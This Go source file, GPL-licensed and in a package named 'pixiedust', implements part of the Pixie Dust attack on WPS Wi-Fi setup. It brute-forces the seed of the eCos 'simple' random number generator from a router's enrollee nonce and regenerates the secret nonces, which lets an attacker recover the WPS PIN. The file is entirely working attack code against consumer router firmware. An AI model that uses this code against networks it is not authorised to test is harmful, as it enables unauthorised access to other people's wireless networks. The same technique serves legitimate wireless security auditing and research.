/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package pixiedust



type ecosSimpleAttack struct {
	known  uint32
	seed   uint32
	match  bool
}



func (pda *pixieDustAttack) attackECOSSimple() {
	esa := ecosSimpleAttack{
		known : uint32(pda.eNonce[0]) << 25,
		seed  : 0,
	}

	esa.findECOSSimpleSeed(pda.eNonce)

	pda.generateECOSSimpleSecrets(esa)
}



func (esa *ecosSimpleAttack) findECOSSimpleSeed(eNonce []byte) {
    if len(eNonce) < wpsNonceLen {
		esa.seed = 0
    }

    for counter := uint32(0); counter < 0x02000000; counter++ {
        esa.seed  = esa.known | counter
		esa.match = true
        
        for i := 1; i < wpsNonceLen; i++ {
            if eNonce[i] != byte(esa.ecosRandSimple()&0xff) {
                esa.match = false
                break
            }
        }
        
		if esa.match { return }
    }
    
	esa.match = false
}



func (esa *ecosSimpleAttack) ecosRandSimple() uint32 {
    s := esa.seed

    s = s*1103515245 + 12345  // Permutate seed
    uret := s & 0xffe00000    // Use top 11 bits

    s = s*1103515245 + 12345        // Permutate seed
    uret += (s & 0xfffc0000) >> 11  // Use top 14 bits

    s = s*1103515245 + 12345               // Permutate seed
    uret += (s & 0xfe000000) >> (11 + 14)  // Use top 7 bits

    esa.seed = s
    return uret
}



func (pda *pixieDustAttack) generateECOSSimpleSecrets(esa ecosSimpleAttack) {
    for i := range wpsSecretNonceLen {
        pda.eSecret1[i] = byte(esa.ecosRandSimple() & 0xff)
    }
    pda.s1Seed = esa.seed

    for i := range wpsSecretNonceLen{
        pda.eSecret2[i] = byte(esa.ecosRandSimple() & 0xff)
    }
    pda.s2Seed = esa.seed
}

